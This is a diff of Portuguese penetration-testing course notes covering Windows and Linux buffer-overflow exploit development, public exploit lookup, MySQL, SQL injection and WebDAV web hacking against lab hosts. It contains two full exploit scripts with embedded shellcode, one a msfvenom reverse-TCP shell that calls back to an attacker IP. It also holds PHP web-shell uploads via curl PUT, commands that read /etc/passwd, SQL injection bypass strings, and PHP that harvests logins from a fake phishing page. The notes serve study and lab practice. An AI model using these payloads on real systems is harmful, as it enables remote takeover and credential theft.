 
-"\xab\xa5\xe6\x44\x40\xf5\xe7\xcc\xb5\x4e\x09\xfc\x68\xc4\x50"
+	"\xab\xa5\xe6\x44\x40\xf5\xe7\xcc\xb5\x4e\x09\xfc\x68\xc4\x50"
 
-"\xde\x8b\x09\xe9\x57\x93\x4e\xd4\x2e\x28\xa4\xa2\xb0\xf8\xf4"
+	"\xde\x8b\x09\xe9\x57\x93\x4e\xd4\x2e\x28\xa4\xa2\xb0\xf8\xf4"
 
-"\x4b\x1e\xc5\x38\xbe\x5e\x02\xfe\x21\x15\x7a\xfc\xdc\x2e\xb9"
+	"\x4b\x1e\xc5\x38\xbe\x5e\x02\xfe\x21\x15\x7a\xfc\xdc\x2e\xb9"
 
-"\x7e\x3b\xba\x59\xd8\xc8\x1c\x85\xd8\x1d\xfa\x4e\xd6\xea\x88"
+	"\x7e\x3b\xba\x59\xd8\xc8\x1c\x85\xd8\x1d\xfa\x4e\xd6\xea\x88"
 
-"\x08\xfb\xed\x5d\x23\x07\x65\x60\xe3\x81\x3d\x47\x27\xc9\xe6"
+	"\x08\xfb\xed\x5d\x23\x07\x65\x60\xe3\x81\x3d\x47\x27\xc9\xe6"
 
-"\xe6\x7e\xb7\x49\x16\x60\x18\x35\xb2\xeb\xb5\x22\xcf\xb6\xd1"
+	"\xe6\x7e\xb7\x49\x16\x60\x18\x35\xb2\xeb\xb5\x22\xcf\xb6\xd1"
 
-"\x87\xe2\x48\x22\x80\x75\x3b\x10\x0f\x2e\xd3\x18\xd8\xe8\x24"
+	"\x87\xe2\x48\x22\x80\x75\x3b\x10\x0f\x2e\xd3\x18\xd8\xe8\x24"
 
-"\x5e\xf3\x4d\xba\xa1\xfc\xad\x93\x65\xa8\xfd\x8b\x4c\xd1\x95"
+	"\x5e\xf3\x4d\xba\xa1\xfc\xad\x93\x65\xa8\xfd\x8b\x4c\xd1\x95"
 
-"\x4b\x70\x04\x39\x1b\xde\xf7\xfa\xcb\x9e\xa7\x92\x01\x11\x97"
+	"\x4b\x70\x04\x39\x1b\xde\xf7\xfa\xcb\x9e\xa7\x92\x01\x11\x97"
 
-"\x83\x2a\xfb\xb0\x2e\xd1\x6c\x7f\x06\xdb\x07\x17\x55\xdb\xd6"
+	"\x83\x2a\xfb\xb0\x2e\xd1\x6c\x7f\x06\xdb\x07\x17\x55\xdb\xd6"
 
-"\x5c\xd0\x3d\xb2\xb2\xb5\x96\x2b\x2a\x9c\x6c\xcd\xb3\x0a\x09"
+	"\x5c\xd0\x3d\xb2\xb2\xb5\x96\x2b\x2a\x9c\x6c\xcd\xb3\x0a\x09"
 
-"\xcd\x38\xb9\xee\x80\xc8\xb4\xfc\x75\x39\x83\x5e\xd3\x46\x39"
+	"\xcd\x38\xb9\xee\x80\xc8\xb4\xfc\x75\x39\x83\x5e\xd3\x46\x39"
 
-"\xf6\xbf\xd5\xa6\x06\xc9\xc5\x70\x51\x9e\x38\x89\x37\x32\x62"
+	"\xf6\xbf\xd5\xa6\x06\xc9\xc5\x70\x51\x9e\x38\x89\x37\x32\x62"
 
-"\x23\x25\xcf\xf2\x0c\xed\x14\xc7\x93\xec\xd9\x73\xb0\xfe\x27"
+	"\x23\x25\xcf\xf2\x0c\xed\x14\xc7\x93\xec\xd9\x73\xb0\xfe\x27"
 
-"\x7b\xfc\xaa\xf7\x2a\xaa\x04\xbe\x84\x1c\xfe\x68\x7a\xf7\x96"
+	"\x7b\xfc\xaa\xf7\x2a\xaa\x04\xbe\x84\x1c\xfe\x68\x7a\xf7\x96"
 
-"\xed\xb0\xc8\xe0\xf1\x9c\xbe\x0c\x43\x49\x87\x33\x6c\x1d\x0f"
+	"\xed\xb0\xc8\xe0\xf1\x9c\xbe\x0c\x43\x49\x87\x33\x6c\x1d\x0f"
 
-"\x4c\x90\xbd\xf0\x87\x10\xdd\x12\x0d\x6d\x76\x8b\xc4\xcc\x1b"
+	"\x4c\x90\xbd\xf0\x87\x10\xdd\x12\x0d\x6d\x76\x8b\xc4\xcc\x1b"
 
-"\x2c\x33\x12\x22\xaf\xb1\xeb\xd1\xaf\xb0\xee\x9e\x77\x29\x83"
+	"\x2c\x33\x12\x22\xaf\xb1\xeb\xd1\xaf\xb0\xee\x9e\x77\x29\x83"
 
-"\x8f\x1d\x4d\x30\xaf\x37")
+	"\x8f\x1d\x4d\x30\xaf\x37")
 
-send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shell
+	send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shell
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("192.168.2.106", 5800))
+	s.connect(("192.168.2.106", 5800))
 
-s.recv(1024)
+	s.recv(1024)
 
-#print banner
+	#print banner
 
-s.send("SEND "+send+"\r\n")
+	s.send("SEND "+send+"\r\n")
 
-#r = s.recv(1024)
+	#r = s.recv(1024)
 
-#print r
+	#print r
 
 
-    DESENVOLVIMENTO DE EXPLOITS WINDOWS 10
-
- 
+## DESENVOLVIMENTO DE EXPLOITS WINDOWS 10
 
     !mona findmsp 
 
-        Encontra o número do OffSet para chegar ao EIP e adiciona +4
+Encontra o número do OffSet para chegar ao EIP e adiciona +4
 
 
-    Exploit Montado no módulo de dev exploit Win10
+- Exploit Montado no módulo de dev exploit Win10
 
-#/usr/bin/python/
+.
 
-import socket
+	#/usr/bin/python/
 
-# /usr/bin/msf-pattern_offset -l 1000 -q 42306142
+	import socket
 
-# Exact match at offset 780
+	# /usr/bin/msf-pattern_offset -l 1000 -q 42306142
 
-# bad chars:  \x00\x0a\x0d\x25\x26\x2b\x3d
+	# Exact match at offset 780
 
-# #dados="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af>
+	# bad chars:  \x00\x0a\x0d\x25\x26\x2b\x3d
 
-# 0x10090c83
+	# #dados="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af>
 
-# windows/shell_reverse_tcp -b "bad_chars" -f c
+	# 0x10090c83
 
-# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.106 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
+	# windows/shell_reverse_tcp -b "bad_chars" -f c
 
-
-shell = ("\xb8\xd6\x7e\xbf\x1b\xd9\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
-
-"\x52\x83\xc2\x04\x31\x42\x0e\x03\x94\x70\x5d\xee\xe4\x65\x23"
-
-"\x11\x14\x76\x44\x9b\xf1\x47\x44\xff\x72\xf7\x74\x8b\xd6\xf4"
-
-"\xff\xd9\xc2\x8f\x72\xf6\xe5\x38\x38\x20\xc8\xb9\x11\x10\x4b"
-
-"\x3a\x68\x45\xab\x03\xa3\x98\xaa\x44\xde\x51\xfe\x1d\x94\xc4"
-
-"\xee\x2a\xe0\xd4\x85\x61\xe4\x5c\x7a\x31\x07\x4c\x2d\x49\x5e"
-
-"\x4e\xcc\x9e\xea\xc7\xd6\xc3\xd7\x9e\x6d\x37\xa3\x20\xa7\x09"
-
-"\x4c\x8e\x86\xa5\xbf\xce\xcf\x02\x20\xa5\x39\x71\xdd\xbe\xfe"
-
-"\x0b\x39\x4a\xe4\xac\xca\xec\xc0\x4d\x1e\x6a\x83\x42\xeb\xf8"
-
-"\xcb\x46\xea\x2d\x60\x72\x67\xd0\xa6\xf2\x33\xf7\x62\x5e\xe7"
-
-"\x96\x33\x3a\x46\xa6\x23\xe5\x37\x02\x28\x08\x23\x3f\x73\x45"
-
-"\x80\x72\x8b\x95\x8e\x05\xf8\xa7\x11\xbe\x96\x8b\xda\x18\x61"
-
-"\xeb\xf0\xdd\xfd\x12\xfb\x1d\xd4\xd0\xaf\x4d\x4e\xf0\xcf\x05"
-
-"\x8e\xfd\x05\x89\xde\x51\xf6\x6a\x8e\x11\xa6\x02\xc4\x9d\x99"
-
-"\x33\xe7\x77\xb2\xde\x12\x10\x7d\xb6\x1e\x8a\x15\xc5\x1e\x4b"
-
-"\x5d\x40\xf8\x21\xb1\x05\x53\xde\x28\x0c\x2f\x7f\xb4\x9a\x4a"
-
-"\xbf\x3e\x29\xab\x0e\xb7\x44\xbf\xe7\x37\x13\x9d\xae\x48\x89"
-
-"\x89\x2d\xda\x56\x49\x3b\xc7\xc0\x1e\x6c\x39\x19\xca\x80\x60"
-
-"\xb3\xe8\x58\xf4\xfc\xa8\x86\xc5\x03\x31\x4a\x71\x20\x21\x92"
-
-"\x7a\x6c\x15\x4a\x2d\x3a\xc3\x2c\x87\x8c\xbd\xe6\x74\x47\x29"
-
-"\x7e\xb7\x58\x2f\x7f\x92\x2e\xcf\xce\x4b\x77\xf0\xff\x1b\x7f"
-
-"\x89\x1d\xbc\x80\x40\xa6\xdc\x62\x40\xd3\x74\x3b\x01\x5e\x19"
-
-"\xbc\xfc\x9d\x24\x3f\xf4\x5d\xd3\x5f\x7d\x5b\x9f\xe7\x6e\x11"
-
-"\xb0\x8d\x90\x86\xb1\x87")
+	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.106 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
 
 
-#dados = "A" * 780 + "\x83\x0c\x09\x10"     + "C" * (1000 - 780)
+	shell = ("\xb8\xd6\x7e\xbf\x1b\xd9\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
 
-dados = "A" * 780 + "\x83\x0c\x09\x10"     + "\x90" * 16 + shell
+	"\x52\x83\xc2\x04\x31\x42\x0e\x03\x94\x70\x5d\xee\xe4\x65\x23"
 
-tam = len(dados) + 20
+	"\x11\x14\x76\x44\x9b\xf1\x47\x44\xff\x72\xf7\x74\x8b\xd6\xf4"
 
-request="POST /login HTTP/1.1\r\n"
+	"\xff\xd9\xc2\x8f\x72\xf6\xe5\x38\x38\x20\xc8\xb9\x11\x10\x4b"
 
-request+="Host: 192.168.254.54\r\n"
+	"\x3a\x68\x45\xab\x03\xa3\x98\xaa\x44\xde\x51\xfe\x1d\x94\xc4"
 
-request+="Content-Length: "+str(tam)+"\r\n"
+	"\xee\x2a\xe0\xd4\x85\x61\xe4\x5c\x7a\x31\x07\x4c\x2d\x49\x5e"
 
-request+="Cache-Control: max-age=0\r\n"
+	"\x4e\xcc\x9e\xea\xc7\xd6\xc3\xd7\x9e\x6d\x37\xa3\x20\xa7\x09"
 
-request+="Upgrade-Insecure-Requests: 1\r\n"
+	"\x4c\x8e\x86\xa5\xbf\xce\xcf\x02\x20\xa5\x39\x71\xdd\xbe\xfe"
 
-request+="Origin: http://192.168.254.54\r\n"
+	"\x0b\x39\x4a\xe4\xac\xca\xec\xc0\x4d\x1e\x6a\x83\x42\xeb\xf8"
 
-request+="Content-Type: application/x-www-form-urlencoded\r\n"
+	"\xcb\x46\xea\x2d\x60\x72\x67\xd0\xa6\xf2\x33\xf7\x62\x5e\xe7"
 
-request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"
+	"\x96\x33\x3a\x46\xa6\x23\xe5\x37\x02\x28\x08\x23\x3f\x73\x45"
 
-request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
+	"\x80\x72\x8b\x95\x8e\x05\xf8\xa7\x11\xbe\x96\x8b\xda\x18\x61"
 
-request+="Referer: http://192.168.254.54/login\r\n"
+	"\xeb\xf0\xdd\xfd\x12\xfb\x1d\xd4\xd0\xaf\x4d\x4e\xf0\xcf\x05"
 
-request+="Accept-Encoding: gzip, deflate\r\n"
+	"\x8e\xfd\x05\x89\xde\x51\xf6\x6a\x8e\x11\xa6\x02\xc4\x9d\x99"
 
-request+="Accept-Language: en-US,en;q=0.9\r\n"
+	"\x33\xe7\x77\xb2\xde\x12\x10\x7d\xb6\x1e\x8a\x15\xc5\x1e\x4b"
 
-request+="Connection: close\r\n"
+	"\x5d\x40\xf8\x21\xb1\x05\x53\xde\x28\x0c\x2f\x7f\xb4\x9a\x4a"
 
-request+="\r\n"
+	"\xbf\x3e\x29\xab\x0e\xb7\x44\xbf\xe7\x37\x13\x9d\xae\x48\x89"
 
-request+="username="+dados+"&password=A"
+	"\x89\x2d\xda\x56\x49\x3b\xc7\xc0\x1e\x6c\x39\x19\xca\x80\x60"
 
-s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	"\xb3\xe8\x58\xf4\xfc\xa8\x86\xc5\x03\x31\x4a\x71\x20\x21\x92"
 
-s.connect(("192.168.2.106", 80))
+	"\x7a\x6c\x15\x4a\x2d\x3a\xc3\x2c\x87\x8c\xbd\xe6\x74\x47\x29"
 
-s.send(request)
+	"\x7e\xb7\x58\x2f\x7f\x92\x2e\xcf\xce\x4b\x77\xf0\xff\x1b\x7f"
+
+	"\x89\x1d\xbc\x80\x40\xa6\xdc\x62\x40\xd3\x74\x3b\x01\x5e\x19"
+
+	"\xbc\xfc\x9d\x24\x3f\xf4\x5d\xd3\x5f\x7d\x5b\x9f\xe7\x6e\x11"
+
+	"\xb0\x8d\x90\x86\xb1\x87")
+
+
+	#dados = "A" * 780 + "\x83\x0c\x09\x10"     + "C" * (1000 - 780)
+
+	dados = "A" * 780 + "\x83\x0c\x09\x10"     + "\x90" * 16 + shell
+
+	tam = len(dados) + 20
+
+	request="POST /login HTTP/1.1\r\n"
+
+	request+="Host: 192.168.254.54\r\n"
+
+	request+="Content-Length: "+str(tam)+"\r\n"
+
+	request+="Cache-Control: max-age=0\r\n"
+
+	request+="Upgrade-Insecure-Requests: 1\r\n"
+
+	request+="Origin: http://192.168.254.54\r\n"
+
+	request+="Content-Type: application/x-www-form-urlencoded\r\n"
+
+	request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"
+
+	request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
+
+	request+="Referer: http://192.168.254.54/login\r\n"
+
+	request+="Accept-Encoding: gzip, deflate\r\n"
+
+	request+="Accept-Language: en-US,en;q=0.9\r\n"
+
+	request+="Connection: close\r\n"
+
+	request+="\r\n"
+
+	request+="username="+dados+"&password=A"
+
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("192.168.2.106", 80))
+
+	s.send(request)
 
 Nota: Resumindo-> Analisa a aplicação, comportamento, faz o primeiro teste que é saber até quantos chars a aplicação crasha, pode se usar o burp suite e testar e depois pegar o código HTML para inserir no script, depois pode se usar o comando do pattern-offset do msf para encontrar o endereço de EIP ou usar o comando !mona findmsp para encontrar o valor que aponta para EIP e usar a seta para poder encontrar o endereço no debugger e usar o f2 para inserir ele no breakpoint e depois encontrar o endereço que faz um JUMP ESP para colocar no EIP, assim apontando para EIP, após isso é necessário gerar códigos ASCII para inserir no programa e identificar os badchars e excluir na hora de gerar o shellcode com o msfvenom e depois inserir o shellcode no script. Com o Immunity debugger deve sempre atentar para restartar o serviço colocar no immunity clicar no botão play, setar um breakpoint para verificar se está correto a inserção do shellcode, lembrar de colocar para escutar na porta informada.
 
-    MECANISMOS DE PROTEÇÃO
 
+## MECANISMOS DE PROTEÇÃO
 
 DEP - Data prevention execution 
 
@@ -3329,8 +3330,8 @@ Por padrão não vem habilitado para todos os programas, caso necessário, ativa
 
 ASLR - Deixar os endereços de memórias aleatórios - Evitando encontrar um endereço fixo. Pode habilitar a função no windows ou adicionar o /DINAMICBASE [:NO] no Código do arquivo.
 
-    BUFFER OVERFLOW - LINUX
 
+## BUFFER OVERFLOW - LINUX
 
 Comandos do debugger está no módulo acima, em: Comandos do GDB e GDB tui para Debugger linux 
 
@@ -3338,491 +3339,462 @@ Passa à passo para chegar no exploit final…
 
     b* 0xendereco 
 
-        Com programa utilizado na aula dá um breakpoint do verifica no parâmetro gets
+Com programa utilizado na aula dá um breakpoint do verifica no parâmetro gets
 
     run < <(python2 -c 'print "A" * 200') 
 
-        Roda o comando com buffer de 200chars
+Roda o comando com buffer de 200chars
 
     i r 
 
-        Olha os registradores
+Olha os registradores
 
     x/16xw $esp 
 
-        Dá um follow nos chars do ESP
+Dá um follow nos chars do ESP
 
     x/16xw $ebp 
 
-        Dá um follow nos chars do EBP
+Dá um follow nos chars do EBP
 
     c 
 
-        Continua com o breakpoint
+Continua com o breakpoint
 
     i r 
 
-        Olha os registradores
+Olha os registradores
 
 
 Analisa o LEA que reserva espaço na memória 0x88 = 136
 
     run < <(python2 -c 'print "A" * 136') 
 
-        Roda o comando com buffer de 136chars
+Roda o comando com buffer de 136chars
 
     x/16xw $esp  
 
-        Dá um follow nos chars do ESP
+Dá um follow nos chars do ESP
 
     x/16xw $ebp 
 
-        Dá um follow nos chars do EBP
+Dá um follow nos chars do EBP
 
     run < <(python2 -c 'print "A" * 136 + "BBBB"') 
 
-        Roda o comando com buffer com buffer EIP
+Roda o comando com buffer com buffer EIP
 
     x/16xw $esp 
 
-        Dá um follow nos chars do ESP
+Dá um follow nos chars do ESP
 
     x/16xw $ebp 
 
-        Dá um follow nos chars do EBP
+Dá um follow nos chars do EBP
 
     run < <(python2 -c 'print "A" * 136 + "BBBB" + "CCCC"') 
 
-        Roda o comando com buffer com buffer EIP + validação
+Roda o comando com buffer com buffer EIP + validação
 
     x/16xw $esp 
 
-        Dá um follow nos chars do ESP
+Dá um follow nos chars do ESP
 
     x/16xw $ebp 
 
-        Dá um follow nos chars do EBP
+Dá um follow nos chars do EBP
 
     c  
 
-        Continua com o breakpoint
+Continua com o breakpoint
 
     i r 
 
-        Olha os registradores
+Olha os registradores
 
 
 Pega o endereço de acessar 0x56556270
 
     run < <(python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"')
 
-        Roda e insere com os chars específicos para o buffer
+Roda e insere com os chars específicos para o buffer
 
     i r 
 
-        Olha os registradores
+Olha os registradores
 
     x/16xw $esp  
 
-        Dá um follow nos chars do ESP
+Dá um follow nos chars do ESP
 
     c 
 
-        Continua com o breakpoint
+Continua com o breakpoint
 
 
-Dicas Debugger
+- Dicas Debugger
+
+.
 
     b*  main 
 
-        Seta breakpoint em main
+Seta breakpoint em main
 
     disas verifica 
 
-        Abre os endereços e códigos da parte verifica
+Abre os endereços e códigos da parte verifica
 
     set $eip  = 0x56556270 ou $eip 
 
-        Seta o endereço em EIP
+Seta o endereço em EIP
 
     d 
 
-        Deleta os breakpoints
+Deleta os breakpoints
 
     disas verifica 
 
-        Abre os endereços e códigos da parte verifica
+Abre os endereços e códigos da parte verifica
 
     b* 0x5655626e 
 
-        Seta breakpoint no endereço informado
+Seta breakpoint no endereço informado
 
     x/20s $eip 
 
-        Dá um dump nas infos gravadas no EIP
+Dá um dump nas infos gravadas no EIP
 
 
-Exploração de binário (desafio)
+- Exploração de binário (desafio)
+
+.
 
     nc 172.30.0.10 8888 
 
-        Sistema vulnerável para ganhar acesso com buffer overflow (./desafio)
+Sistema vulnerável para ganhar acesso com buffer overflow (./desafio)
 
     info functions 
 
-        Dá uma olhada nas funções do sistema
+Dá uma olhada nas funções do sistema
 
     disas main  
 
-        Abre os endereços e códigos da parte Main
+Abre os endereços e códigos da parte Main
 
     run < <(python2 -c 'print "A" * 150') 
 
-        Roda o comando com buffer de 150chars
+Roda o comando com buffer de 150chars
 
     b *  0x0804855b 
 
-        Seta breakpoint no endereço informado
+Seta breakpoint no endereço informado
 
     c 
 
-        Continua com o programa rodando depois do breakpoint
+Continua com o programa rodando depois do breakpoint
 
     x/20xw $esp 
 
-        Dá um dump nas infos gravadas no ESP
+Dá um dump nas infos gravadas no ESP
 
     i r 
 
-        Olha os registradores
+Olha os registradores
 
 
-Usar o patternCreate
+- Usar o patternCreate
+
+.
 
     run < <(python2 -c 'print "A" * 136 + "BBBB"') 
 
-        Roda o comando com buffer de 136 chars + EIP
+Roda o comando com buffer de 136 chars + EIP
 
     c 
 
-        Continua com o programa rodando depois do breakpoint
+Continua com o programa rodando depois do breakpoint
 
 
-Add o endereço da função do exploit 0x080484c0 no exploit
+- Add o endereço da função do exploit 0x080484c0 no exploit
+
+.
 
     run < <(python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ') 
 
-        Roda o comando com buffer de 136chars + EIP e o endereço de exploração que chama o exploit descoberto acima
+Roda o comando com buffer de 136chars + EIP e o endereço de exploração que chama o exploit descoberto acima
 
     c 
 
-        Continua com o programa rodando depois do breakpoint
+Continua com o programa rodando depois do breakpoint
 
     python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ' | nc 172.30.0.10 8888  
 
-        Exploit já criado pronto para ser executado no servidor que se encontra o programa.
+Exploit já criado pronto para ser executado no servidor que se encontra o programa.
 
 
 
-    TRABALHANDO COM EXPLOITS PÚBLICOS
+## TRABALHANDO COM EXPLOITS PÚBLICOS
 
 
-    Base de dados de exploits
+Base de dados de exploits
 
         Exploit-db.com
-
         Packerstormsecurity.com
-
         Securityfocus.com
-
         Cve.mitre.org
+.
 
+	site:exploit-db.com "ipfire" 
 
-    site:exploit-db.com "ipfire" 
-
-        Pesquisa no google por vulnerabilidade no site passado
+Pesquisa no google por vulnerabilidade no site passado
 
     searchsploit -u 
 
-        Update a database de exploits (Tem a base de dados do exploit-db)
+Update a database de exploits (Tem a base de dados do exploit-db)
 
     searchsploit webmin 
 
-        Procura pelo exploit do serviço informado
+Procura pelo exploit do serviço informado
 
     searchsploit webmin --exclude="phpMy|Dans" 
 
-        Filtros de exploits quando vem algo indesejado
+Filtros de exploits quando vem algo indesejado
 
     searchsploit -e smb 
 
-        Procura exatamente pelo termo informado
+Procura exatamente pelo termo informado
 
     searchsploit --id -m 41149 
 
-        Copia o exploit para o diretório atual (para exibir o ID é só passar o --id)
+Copia o exploit para o diretório atual (para exibir o ID é só passar o --id)
 
 
-Usando o exploit em C para vulnerabilidade do syncbreeze
+- Usando o exploit em C para vulnerabilidade do syncbreeze
 
-mingw Instalar software compilador do exploit para windows, o gcc não compila devido as libraries
+`mingw` Instalar software compilador do exploit para windows, o gcc não compila devido as libraries
 
     i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32 
 
-        Compila o código executável (exploit)
+Compila o código executável (exploit)
 
 
 
-    PENTEST WEB - WEB HACKING
+## PENTEST WEB - WEB HACKING
 
 
 Ferramentas: Gobuster, burp suite
 
     http://burp Para baixar o certificado e configurar no navegador.
-
     FoxProxy Plugin para ativar e desativar o proxy sem precisar ficar configurando
-
     CookieManager Manipular cookies e fazer testes
-
 
 Nota: Php não mostra o código fonte próprio, mas o HTML e JS sim.
 
-Comandos MySQL
+- Comandos MySQL
+
+.
 
 Todos os comandos são intuitivos, não precisa de descrição...
 
     sudo service start mysql
-
     sudo mysql
-
     show databases;
-
     select database();
-
     select user();
-
     select version();
-
     create database DESEC;
-
     use desec;
-
     show tables;
-
     create table usuarios
-
         (id int primary key auto_increment,
-
         login varchar(20) not null,
-
         senha varchar(20) not null);
-
     describe usuarios;
-
     select id from usuarios;
-
     insert into usuarios values ('1','admin','admin');
-
     insert into users (id, login, pass) values ('1','admin','admin');
-
     select * from usuarios;
-
     selec login from usuarios;
-
     select * usuarios where senha="admin"
-
     select * usuarios order by login;
-
     delete from usuarios where id="7";
 
-
     use mysql;
-
     show tables;
-
     describe user;
-
     select host, user, password from user;
-
     create user ygor identified by 'senha123';
-
     GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
-
     GRANT ALL PRIVILEGES ON database_name. * TO 'username'@'localhost' identified by 'p4$$';
-
     alter user 'root'@'localhost' identified with mysql_native_password by 'root';
-
     use informatio_schema;
-
     show tables;
-
     select * schemata; Traz todas as bases de dados
-
     describe tables;
-
     select table_schema, table_name from tables; 
-
-        Traz todas as tabelas de todos os bancos
+    
+Traz todas as tabelas de todos os bancos
 
     select table_name from tables where table_schema="desec"; 
 
-        Mostra diretamente as tabelas da base desec
+Mostra diretamente as tabelas da base desec
 
     describe columns;
-
     select column_name from columns where table_schema="desec"; 
 
-        Faz um filtro para mostrar a tabela usuarios da base desec
+Faz um filtro para mostrar a tabela usuarios da base desec
 
     use desec;
-
     select login,senha from usuarios;
-
     select concat(login, ':' ,senha) from usuarios 
 
-        Coloca uma concatenação no que o comando traz deixando mais simples
+Coloca uma concatenação no que o comando traz deixando mais simples
 
     select @@version
-
     select 45+54
-
     select load_file('/var/www/html/index.html'); 
 
-        Carrega arquivo dentro do sgdb
+Carrega arquivo dentro do sgdb
 
     select sleep(10); 
 
-        Aguarda em segundos a resposta do banco
+Aguarda em segundos a resposta do banco
 
     select char(55); 
 
-        Taz um caractere correspondente
+Taz um caractere correspondente
 
     select length("desec");
-
     select substring("desec",1,3); 
 
-        Traz as 3 primeiras letras da palavra
+Traz as 3 primeiras letras da palavra
 
     drop database teste;
-
     source \home\user\Desktop\test.sql;
 
 
-Sql Injection
+- Sql Injection
 
-select * from user where login='user' and senha='1234';
+.
 
-select * from user where login='hacker' or 1=1;# senha='1234';
+	select * from user where login='user' and senha='1234';
 
-select * from user where login='user' or 1=1;#
+	select * from user where login='hacker' or 1=1;# senha='1234';
 
-select * from user where login='user' or true limit 1;#
+	select * from user where login='user' or 1=1;#
 
-select * from user where login='user' and login='user' limit 1;#
+	select * from user where login='user' or true limit 1;#
+
+	select * from user where login='user' and login='user' limit 1;#
+	
+.
 
     gobuster dir -u -e http://172.16.1.10 -u /wordlist.txt -s "200,301,302,401" -a user-agent
 
-        Bruteforce de diretórios filtrando cod http e user agent
+Bruteforce de diretórios filtrando cod http e user agent
 
     gobuster dir -u -e http://172.16.1.10 -u /wordlist.txt -s "200,301,302,401" -x .php,.txt,.sql,.bkp
 
-        Bruteforce de diretórios filtrando cod http e extensão de arquivos.
+Bruteforce de diretórios filtrando cod http e extensão de arquivos.
 
     curl -v -X OPTIONS http://172.16.1.10 
 
-        Verifica todos os métodos do diretório, passar os outros dirs
+Verifica todos os métodos do diretório, passar os outros dirs
 
     nc -v 172.16.1.10 80 -C | PUT /webdav/ HTTP/1.1 host: 172.16.1.10 
 
-        Testando o metodo PUT
+Testando o metodo PUT
 
     nc -v 172.16.1.10 80 -C | DELETE /webdav/ HTTP/1.1 host: 172.16.1.10 
 
-        Testando o metodo PUT
+Testando o metodo PUT
 
     curl -v -X PUT http://172.16.1.10/webdav/test.txt 
 
-        Cria um arquivo no DIR
+Cria um arquivo no DIR
 
     curl -v -X DELETE http://172.16.1.10/webdav/test.txt 
 
-        Deleta o arquivo do DIR
+Deleta o arquivo do DIR
 
 
 Nota: CVE-2017-12615 Vulnerabilidade de exploração do método PUT no webdav
 
     curl -v -X PUT -d "<?php system('id');?>" https://172.16.1.10/webdav/comand.php 
 
-        Envia comando em php para interpretar e ganhar acesso ao host.
+Envia comando em php para interpretar e ganhar acesso ao host.
 
     curl -v -X PUT -d "<?php system(\$_GET["desec"])?>" http://172.16.1.10/webdav/com_par.php
 
-        Na URL passa o parâmetro /?desec=cat /etc/passwd Explora podendo executar comandos
+Na URL passa o parâmetro /?desec=cat /etc/passwd Explora podendo executar comandos
 
     curl -v http://172.16.1.10/webdav/ --upload-file shell.php 
 
-        Fazer upload do código em php para o dir
+Fazer upload do código em php para o dir
 
     shell.php <?php system($_GET["desec"]); ?> 
 
-        Arquivo shell para chamar na URL e executar comandos (/?desec=cat /etc/passwd)
+Arquivo shell para chamar na URL e executar comandos (/?desec=cat /etc/passwd)
 
     cadaver http://172.16.1.10/webdav/
 
-        Ferramenta para invadir o host podendo dá um HELP e ver o comandos disponíveis
+Ferramenta para invadir o host podendo dá um HELP e ver o comandos disponíveis
 
     davtest --url http://172.16.1.10/webdav/ 
 
-        Testa a aplicação e retorno sobre os tipos de arquivos aceitos
+Testa a aplicação e retorno sobre os tipos de arquivos aceitos
 
     curl -c -X POST http://172.16.1.10/logs 
 
-        Da bypass no diretório que estava pedindo autenticação, mas só funciona se a página aceitar o método POST
+Da bypass no diretório que estava pedindo autenticação, mas só funciona se a página aceitar o método POST
 
 
 Nota: Atentar para vetores de ataques que podem ser: Métodos, campos de formulários, comportamento da página, ver código fonte, procurar por redirecionamentos dentro do site, podendo gerar uma página fake e enganar o usuário...
 
-    Código em PHp para usar em páginas falsas:
+- Código em PHp para usar em páginas falsas:
 
-<?php
+.
 
-$caixa1 = $_POST["login"] . "\n";
+	<?php
 
-$caixa2 = $_POST["senha"] . "\n";
+	$caixa1 = $_POST["login"] . "\n";
 
-$file = fopen("senhas.txt", "a");
+	$caixa2 = $_POST["senha"] . "\n";
 
-$escrever1 = fwrite($file, $caixa1);
+	$file = fopen("senhas.txt", "a");
 
-$escrever2 = fwrite($file, $caixa2);
+	$escrever1 = fwrite($file, $caixa1);
 
-fclose($file); 
+	$escrever2 = fwrite($file, $caixa2);
 
